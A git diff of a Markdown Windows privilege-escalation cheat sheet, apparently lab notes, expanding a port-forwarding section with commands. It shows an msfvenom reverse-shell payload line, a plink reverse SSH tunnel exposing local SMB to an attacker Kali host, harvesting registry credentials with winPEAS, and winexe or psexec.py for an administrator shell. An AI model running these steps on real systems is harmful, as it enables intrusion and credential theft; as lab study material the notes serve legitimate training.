@@ -907,9 +907,19 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o 
 # <span style="color:lightblue">Port Forwarding</span>
 
 ## <span style="color:lightgreen">Methodology</span>
-you need to check the local open ports in the windows machine that you didn't get from the nmap scan. local service might be running in windows machine
+Let us first understand what Port Forwarding is. Sometimes, after you hack the device, there are internal ports. These internal ports may be infected with a specific vulnerability and operate with high powers, or you may benefit from them in general by increasing permissions.
+
 ## <span style="color:lightgreen">Detection</span>
-check the open ports in the machine using `"netstate -ano"`. assume port 445 is locally opened so you need to check what is there. use `"plink.exe"` for port forwarding
+When I did nmap scan on the machine. we didn't get either SMB nor RDP 
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bea0a5de-6c5d-4c0a-9f59-a71b21351eab)
+
+1. run winPEASE and look for clear credentials in the registry; if you already have ignore the this step
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ca9fb58c-1cb9-44c1-9af7-148665edbbdc)
+
+2. check the internal open ports in the machine using `"netstate -ano"`. port 445 is locally opened so you need to check what is there. use ssh with `"plink.exe"` for port forwarding
+download from here  https://github.com/fwbuilder/w32-bin/blob/master/plink.exe
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/64ca3155-5c20-4c3f-b8f4-47f0232620e1)
+
 ## <span style="color:lightgreen">Exploitation</span>
 
 1.  install ssh and edit the config file (kali)
@@ -919,10 +929,25 @@ check the open ports in the machine using `"netstate -ano"`. assume port 445 is 
 PermitRootLogin yes
 service ssh restart && service ssh enable
 ```
-3.  from the Windows machine
--     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
-4.  now you need to use winexe tool to execute a command in Windows
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9cbb48fa-f75d-4e43-8d08-61d8c1233746)
+
+3.  transfer plink tool to the Windows machine and run the following command
+```
+plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
+#OR
+plink.exe <kaliUser>@<kaliIP> -R <SMBserviceinWindows port 445>:127.0.0.1:<OpenPortInKali>
+```
+4. run `"netstat -tlp"` on kali to ensure that new port was opened in kali machine
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/16d7e702-43ad-4df4-b91e-7730b80bf267)
+
+5.  now you need to use winexe tool to execute a command in Windows
 -     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
+
+5. You also can get an elevated shell using psexec.py  https://github.com/fortra/impacket/blob/master/examples/psexec.py 
+```
+psexec.py admin:password123@127.0.0.1 cmd  #creds that you found in registry using winPEASE
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a224b657-ddd6-4631-8f6b-e295413f9ee3)
 
 # <span style="color:lightblue">Windows Subsystem for Linux</span>
 
@@ -946,7 +971,7 @@ now you are running linux machine. you can use linux commands and continue enume
 ## <span style="color:lightgreen">Methodology</span>
 Check DLL Hijacking from hacktricks FYR.
 
-Some servers rely on DLL files at the time, but if the DLL file that the server relies on is deleted, Windows will search it in several paths. Of course, please feel free to mention them to you.:
+Some servers rely on DLL files at the time, but if the DLL file that the server relies on is deleted, Windows will search it in several paths:
 
 -   The directory from which the application is loaded
 -   `C:\Windows\System32`
